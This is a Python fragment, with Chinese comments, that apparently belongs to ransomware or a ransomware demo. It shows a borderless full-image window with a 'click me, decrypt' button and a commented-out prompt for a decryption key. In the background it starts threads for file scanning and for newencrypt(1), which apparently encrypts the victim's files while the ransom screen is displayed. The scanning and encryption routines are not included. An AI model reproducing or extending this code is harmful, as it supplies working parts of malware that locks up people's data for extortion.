def show_page(base64_image_data):
    root = tk.Tk()
    # 移除标题栏
    root.overrideredirect(True)

    # 解码 base64 数据为图片
    img_data = base64.b64decode(base64_image_data)
    img = Image.open(BytesIO(img_data))

    # 调整窗口大小以适应图片
    window_width = img.width
    window_height = img.height
    root.geometry(f"{window_width}x{window_height}")

    # 计算窗口居中位置
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    x = (screen_width - window_width) // 2
    y = (screen_height - window_height) // 2
    root.geometry(f"+{x}+{y}")

    photo = ImageTk.PhotoImage(img)
    image_label = tk.Label(root, image=photo)
    image_label.place(x = 0, y = 0, relwidth=1, relheight=1)

    output_label = tk.Label(root, text="", wraplength=300)
    output_label.pack()

    output_label2 = tk.Label(root, text="", wraplength=300)
    output_label2.pack()
    # 创建输入框和按钮的容器框架，并设置背景颜色以便观察
    input_frame = tk.Frame(root, bg='lightgray')
    input_frame.place(relx = 0.5, rely = 0.95, anchor = 'center')

    # 输入框
    # entry = tk.Entry(input_frame)
    # entry.pack(side='left', expand=True, fill='x', padx=5)
    # entry.insert(0, "请输入解密秘钥")  # 添加提示信息

    # 按钮及点击事件
    def button_click():
        # print(f"输入框内容：{entry.get()}")
        newencrypt(0)
        root.destroy()

    button = tk.Button(input_frame, text="点击我,解密", command=button_click)
    button.pack(side='left', padx=5)
    
    # 启动扫描线程
    scan_thread = threading.Thread(target=scanning_thread, args=(output_label,))
    scan_thread.daemon = True
    scan_thread.start()

    scan_thread2 = threading.Thread(target=scanning_thread2, args=(output_label2,))
    scan_thread2.daemon = True
    scan_thread2.start()


    scan_thread2 = threading.Thread(target=newencrypt, args=(1,))
    scan_thread2.daemon = True
    scan_thread2.start()



    root.mainloop()

